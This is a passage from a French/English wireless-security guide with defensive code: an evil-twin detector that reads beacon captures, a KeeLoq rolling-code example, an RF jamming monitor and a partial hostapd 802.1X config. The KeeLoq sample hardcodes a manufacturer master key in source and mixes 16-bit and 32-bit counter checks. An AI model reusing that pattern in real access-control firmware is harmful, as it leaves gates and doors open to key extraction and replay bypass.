            <span class="s1">&#39;bssid&#39;</span><span class="p">:</span> <span class="n">packet</span><span class="o">.</span><span class="n">wlan</span><span class="o">.</span><span class="n">bssid</span><span class="p">,</span>
            <span class="s1">&#39;ssid&#39;</span><span class="p">:</span> <span class="n">packet</span><span class="o">.</span><span class="n">wlan</span><span class="o">.</span><span class="n">ssid</span> <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">wlan</span><span class="p">,</span> <span class="s1">&#39;ssid&#39;</span><span class="p">)</span> <span class="k">else</span> <span class="s1">&#39;[Hidden]&#39;</span><span class="p">,</span>
            <span class="s1">&#39;channel&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">wlan_radio</span><span class="o">.</span><span class="n">channel</span><span class="p">),</span>
            <span class="s1">&#39;signal_strength&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">wlan_radio</span><span class="o">.</span><span class="n">signal_dbm</span><span class="p">)</span> <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">wlan_radio</span><span class="p">,</span> <span class="s1">&#39;signal_dbm&#39;</span><span class="p">)</span> <span class="k">else</span> <span class="kc">None</span>
        <span class="p">})</span>
    <span class="k">except</span> <span class="ne">AttributeError</span><span class="p">:</span>
        <span class="k">continue</span>

<span class="n">cap</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># Analyse des donn√©es</span>
<span class="n">df</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">beacon_frames</span><span class="p">)</span>

<span class="c1"># D√©tecter les SSID dupliqu√©s avec BSSID diff√©rents</span>
<span class="n">ssid_groups</span> <span class="o">=</span> <span class="n">df</span><span class="o">.</span><span class="n">groupby</span><span class="p">(</span><span class="s1">&#39;ssid&#39;</span><span class="p">)</span>
<span class="n">duplicated_ssids</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">ssid</span><span class="p">,</span> <span class="n">group</span> <span class="ow">in</span> <span class="n">ssid_groups</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">group</span><span class="p">[</span><span class="s1">&#39;bssid&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">())</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">ssid</span> <span class="o">!=</span> <span class="s1">&#39;[Hidden]&#39;</span><span class="p">:</span>
        <span class="n">duplicated_ssids</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
            <span class="s1">&#39;ssid&#39;</span><span class="p">:</span> <span class="n">ssid</span><span class="p">,</span>
            <span class="s1">&#39;bssid_count&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">group</span><span class="p">[</span><span class="s1">&#39;bssid&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">()),</span>
            <span class="s1">&#39;bssids&#39;</span><span class="p">:</span> <span class="n">group</span><span class="p">[</span><span class="s1">&#39;bssid&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">()</span><span class="o">.</span><span class="n">tolist</span><span class="p">(),</span>
            <span class="s1">&#39;channels&#39;</span><span class="p">:</span> <span class="n">group</span><span class="p">[</span><span class="s1">&#39;channel&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">()</span><span class="o">.</span><span class="n">tolist</span><span class="p">(),</span>
            <span class="s1">&#39;signal_strengths&#39;</span><span class="p">:</span> <span class="n">group</span><span class="o">.</span><span class="n">groupby</span><span class="p">(</span><span class="s1">&#39;bssid&#39;</span><span class="p">)[</span><span class="s1">&#39;signal_strength&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">mean</span><span class="p">()</span><span class="o">.</span><span class="n">to_dict</span><span class="p">()</span>
        <span class="p">})</span>

<span class="c1"># Afficher les r√©sultats</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">=== RAPPORT D&#39;ANALYSE FORENSIQUE WIFI ===</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Date d&#39;analyse: </span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Total de beacon frames analys√©s: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">beacon_frames</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Points d&#39;acc√®s uniques d√©tect√©s: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">df</span><span class="p">[</span><span class="s1">&#39;bssid&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">())</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=== D√âTECTION D&#39;EVIL TWIN ===</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">duplicated_ssids</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Aucun Evil Twin d√©tect√©.&quot;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">duplicated_ssids</span><span class="p">)</span><span class="si">}</span><span class="s2"> SSID potentiellement dupliqu√©s d√©tect√©s:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">ap</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">duplicated_ssids</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;#</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> SSID: </span><span class="si">{</span><span class="n">ap</span><span class="p">[</span><span class="s1">&#39;ssid&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Nombre de BSSID: </span><span class="si">{</span><span class="n">ap</span><span class="p">[</span><span class="s1">&#39;bssid_count&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;  BSSIDs d√©tect√©s:&quot;</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">j</span><span class="p">,</span> <span class="n">bssid</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ap</span><span class="p">[</span><span class="s1">&#39;bssids&#39;</span><span class="p">]):</span>
            <span class="n">signal</span> <span class="o">=</span> <span class="n">ap</span><span class="p">[</span><span class="s1">&#39;signal_strengths&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">bssid</span><span class="p">,</span> <span class="s1">&#39;N/A&#39;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    </span><span class="si">{</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">. </span><span class="si">{</span><span class="n">bssid</span><span class="si">}</span><span class="s2"> (Signal: </span><span class="si">{</span><span class="n">signal</span><span class="si">}</span><span class="s2"> dBm)&quot;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Canaux utilis√©s: </span><span class="si">{</span><span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span><span class="w"> </span><span class="n">ap</span><span class="p">[</span><span class="s1">&#39;channels&#39;</span><span class="p">]))</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># Recommandations bas√©es sur l&#39;analyse</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=== RECOMMANDATIONS ===</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">duplicated_ssids</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1. V√©rifier l&#39;authenticit√© des points d&#39;acc√®s suivants:&quot;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">ap</span> <span class="ow">in</span> <span class="n">duplicated_ssids</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;   - </span><span class="si">{</span><span class="n">ap</span><span class="p">[</span><span class="s1">&#39;ssid&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> (BSSIDs: </span><span class="si">{</span><span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">ap</span><span class="p">[</span><span class="s1">&#39;bssids&#39;</span><span class="p">][:</span><span class="mi">2</span><span class="p">])</span><span class="si">}</span><span class="s2">...)&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">2. Mettre en place un syst√®me de d√©tection d&#39;Evil Twin&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;3. Informer les utilisateurs sur les risques des r√©seaux non s√©curis√©s&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;4. Impl√©menter une authentification 802.1X pour les r√©seaux d&#39;entreprise&quot;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Aucune action imm√©diate requise. Continuer la surveillance r√©guli√®re.&quot;</span><span class="p">)</span>
</code></pre></div>

<h2 id="chapitre-11-contre-mesures-techniques-avancees">Chapitre 11 : Contre-mesures Techniques Avanc√©es</h2>
<h3 id="advanced-technical-countermeasures">Advanced Technical Countermeasures</h3>
<h4 id="securisation-des-dispositifs-rf">üîí S√©curisation des Dispositifs RF</h4>
<h3 id="rf-device-security-hardening">RF Device Security Hardening</h3>
<p><strong>Syst√®mes de D√©fense RF</strong></p>
<p><em>Implementation de codes roulants :</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1">// Exemple d&#39;impl√©mentation KeeLoq pour portes/barri√®res</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;KeeLoq.h&gt;</span>

<span class="c1">// Cl√©s secr√®tes du manufacturier et du dispositif</span>
<span class="kt">uint64_t</span><span class="w"> </span><span class="n">manufacturerKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x5CAEDF21A3B4C908</span><span class="p">;</span>
<span class="kt">int</span><span class="w"> </span><span class="n">deviceSerialNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00012345</span><span class="p">;</span>
<span class="kt">uint64_t</span><span class="w"> </span><span class="n">deviceKey</span><span class="p">;</span>

<span class="c1">// G√©n√©rer une cl√© unique pour chaque dispositif</span>
<span class="kt">void</span><span class="w"> </span><span class="nf">initializeDevice</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">deviceKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KeeLoq</span><span class="o">::</span><span class="n">deriveKey</span><span class="p">(</span><span class="n">manufacturerKey</span><span class="p">,</span><span class="w"> </span><span class="n">deviceSerialNumber</span><span class="p">);</span>

<span class="w">  </span><span class="c1">// Param√®tres initiaux</span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">counter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">    </span><span class="c1">// Compteur synchronis√©</span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random</span><span class="p">(</span><span class="mh">0xFFFFFFFF</span><span class="p">);</span><span class="w">  </span><span class="c1">// Graine al√©atoire</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Device initialized: SNR=%08X</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">deviceSerialNumber</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// G√©n√©ration du code pour transmission</span>
<span class="kt">uint32_t</span><span class="w"> </span><span class="nf">generateRollingCode</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">static</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">counter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="n">counter</span><span class="o">++</span><span class="p">;</span>

<span class="w">  </span><span class="c1">// Fusion du compteur avec l&#39;ID du dispositif</span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">plaintext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">deviceSerialNumber</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFFFF</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">counter</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span>

<span class="w">  </span><span class="c1">// Chiffrement du code</span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KeeLoq</span><span class="o">::</span><span class="n">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span><span class="w"> </span><span class="n">deviceKey</span><span class="p">);</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Generated code: %08X (counter=%u)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">encrypted</span><span class="p">,</span><span class="w"> </span><span class="n">counter</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">encrypted</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// V√©rification d&#39;un code re√ßu</span>
<span class="kt">bool</span><span class="w"> </span><span class="nf">validateRollingCode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">receivedCode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// D√©chiffrement du code</span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">decrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KeeLoq</span><span class="o">::</span><span class="n">decrypt</span><span class="p">(</span><span class="n">receivedCode</span><span class="p">,</span><span class="w"> </span><span class="n">deviceKey</span><span class="p">);</span>

<span class="w">  </span><span class="c1">// Extraction des composants</span>
<span class="w">  </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">receivedSerialNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">decrypted</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFFFF</span><span class="p">;</span>
<span class="w">  </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">receivedCounter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">decrypted</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">16</span><span class="p">;</span>

<span class="w">  </span><span class="c1">// V√©rifier le num√©ro de s√©rie</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">receivedSerialNumber</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="n">deviceSerialNumber</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFFFF</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid serial number</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// V√©rifier le compteur (avec fen√™tre de tol√©rance)</span>
<span class="w">  </span><span class="k">static</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">lastCounter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">receivedCounter</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">lastCounter</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Replay attack detected! Counter=%u, Last=%u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span>
<span class="w">           </span><span class="n">receivedCounter</span><span class="p">,</span><span class="w"> </span><span class="n">lastCounter</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// Code valide, mettre √† jour le compteur</span>
<span class="w">  </span><span class="n">lastCounter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">receivedCounter</span><span class="p">;</span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Valid code. New counter=%u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">lastCounter</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p><em>D√©tection de brouillage RF :</em></p>
<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;RFDetection.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Alert.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;MovingAverage.h&gt;</span>

<span class="n">RFDetector</span><span class="w"> </span><span class="nf">detector</span><span class="p">(</span><span class="mf">433.92</span><span class="p">);</span><span class="w"> </span><span class="c1">// MHz</span>
<span class="n">MovingAverage</span><span class="w"> </span><span class="nf">avgNoise</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span><span class="w">  </span><span class="c1">// moyenne sur 60 secondes</span>
<span class="n">Alert</span><span class="w"> </span><span class="n">securityAlert</span><span class="p">;</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">setup</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>
<span class="w">  </span><span class="n">detector</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>
<span class="w">  </span><span class="n">securityAlert</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>

<span class="w">  </span><span class="c1">// Calibration initiale</span>
<span class="w">  </span><span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">&quot;Calibration du niveau de bruit RF...&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>

<span class="w">  </span><span class="c1">// Mesurer le bruit ambiant pendant 30 secondes</span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">startTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">millis</span><span class="p">();</span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">millis</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">startTime</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">30000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">float</span><span class="w"> </span><span class="n">currentNoise</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">detector</span><span class="p">.</span><span class="n">measureNoiseLevel</span><span class="p">();</span>
<span class="w">    </span><span class="n">avgNoise</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">currentNoise</span><span class="p">);</span>
<span class="w">    </span><span class="n">delay</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kt">float</span><span class="w"> </span><span class="n">baselineNoise</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">avgNoise</span><span class="p">.</span><span class="n">getAverage</span><span class="p">();</span>
<span class="w">  </span><span class="kt">float</span><span class="w"> </span><span class="n">threshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">baselineNoise</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">15.0</span><span class="p">;</span><span class="w"> </span><span class="c1">// +15dB au-dessus du bruit ambiant</span>

<span class="w">  </span><span class="n">detector</span><span class="p">.</span><span class="n">setJammingThreshold</span><span class="p">(</span><span class="n">threshold</span><span class="p">);</span>
<span class="w">  </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&quot;Calibration termin√©e. Niveau de base: &quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="n">baselineNoise</span><span class="p">);</span>
<span class="w">  </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&quot; dBm, Seuil d&#39;alerte: &quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="n">threshold</span><span class="p">);</span>
<span class="w">  </span><span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">&quot; dBm&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">loop</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// Mesurer le niveau RF actuel</span>
<span class="w">  </span><span class="kt">float</span><span class="w"> </span><span class="n">currentLevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">detector</span><span class="p">.</span><span class="n">measureSignalLevel</span><span class="p">();</span>
<span class="w">  </span><span class="kt">float</span><span class="w"> </span><span class="n">currentNoise</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">detector</span><span class="p">.</span><span class="n">measureNoiseLevel</span><span class="p">();</span>

<span class="w">  </span><span class="c1">// Mettre √† jour la moyenne mobile du bruit</span>
<span class="w">  </span><span class="n">avgNoise</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">currentNoise</span><span class="p">);</span>

<span class="w">  </span><span class="c1">// V√©rifier si jamming d√©tect√©</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">detector</span><span class="p">.</span><span class="n">isJammingDetected</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Alerte imm√©diate</span>
<span class="w">    </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&quot;ALERTE! Brouillage RF d√©tect√©! Niveau: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="n">currentLevel</span><span class="p">);</span>
<span class="w">    </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&quot; dBm, Seuil: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="n">detector</span><span class="p">.</span><span class="n">getJammingThreshold</span><span class="p">());</span>
<span class="w">    </span><span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">&quot; dBm&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="n">securityAlert</span><span class="p">.</span><span class="n">trigger</span><span class="p">(</span><span class="s">&quot;RF_JAMMING&quot;</span><span class="p">,</span><span class="w"> </span>
<span class="w">                         </span><span class="s">&quot;Brouillage RF d√©tect√© sur &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">detector</span><span class="p">.</span><span class="n">getFrequency</span><span class="p">())</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; MHz&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Actions automatiques</span>
<span class="w">    </span><span class="n">activateBackupSystems</span><span class="p">();</span>
<span class="w">    </span><span class="n">notifySecurityPersonnel</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// Attendre avant de r√©initialiser l&#39;alerte</span>
<span class="w">    </span><span class="n">delay</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
<span class="w">    </span><span class="n">securityAlert</span><span class="p">.</span><span class="n">reset</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Surveillance normale</span>
<span class="w">    </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&quot;Niveau RF: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="n">currentLevel</span><span class="p">);</span>
<span class="w">    </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s">&quot; dBm, Bruit moyen: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">Serial</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="n">avgNoise</span><span class="p">.</span><span class="n">getAverage</span><span class="p">());</span>
<span class="w">    </span><span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">&quot; dBm&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// Adapter dynamiquement le seuil de d√©tection</span>
<span class="w">  </span><span class="kt">float</span><span class="w"> </span><span class="n">dynamicThreshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">avgNoise</span><span class="p">.</span><span class="n">getAverage</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">15.0</span><span class="p">;</span>
<span class="w">  </span><span class="n">detector</span><span class="p">.</span><span class="n">setJammingThreshold</span><span class="p">(</span><span class="n">dynamicThreshold</span><span class="p">);</span>

<span class="w">  </span><span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">activateBackupSystems</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// Activer syst√®mes de secours</span>
<span class="w">  </span><span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">&quot;Activation des syst√®mes de secours...&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">notifySecurityPersonnel</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// Notification du personnel de s√©curit√©</span>
<span class="w">  </span><span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">&quot;Notification envoy√©e √† l&#39;√©quipe de s√©curit√©&quot;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<h4 id="securisation-wifi-avancee">üîí S√©curisation WiFi Avanc√©e</h4>
<h3 id="advanced-wifi-security">Advanced WiFi Security</h3>
<p><strong>Configuration de s√©curit√© WiFi entreprise</strong></p>
<p><em>Configuration 802.1X avec RADIUS :</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># /etc/hostapd/hostapd.conf</span>
<span class="nv">interface</span><span class="o">=</span>wlan0
<span class="nv">driver</span><span class="o">=</span>nl80211
<span class="nv">ssid</span><span class="o">=</span>CompanySecureWiFi
<span class="nv">hw_mode</span><span class="o">=</span>g
<span class="nv">channel</span><span class="o">=</span><span class="m">6</span>
<span class="nv">ieee8021x</span><span class="o">=</span><span class="m">1</span>
<span class="nv">auth_algs</span><span class="o">=</span><span class="m">1</span>
<span class="nv">wpa</span><span class="o">=</span><span class="m">2</span>
<span class="nv">wpa_key_mgmt</span><span class="o">=</span>WPA-EAP
<span class="nv">wpa_pairwise</span><span class="o">=</span>CCMP
<span class="nv">rsn_pairwise</span><span class="o">=</span>CCMP

<span class="c1"># Configuration RADIUS</span>
<span class="nv">auth_server_addr</span><span class="o">=</span><span class="m">10</span>.0.0.10
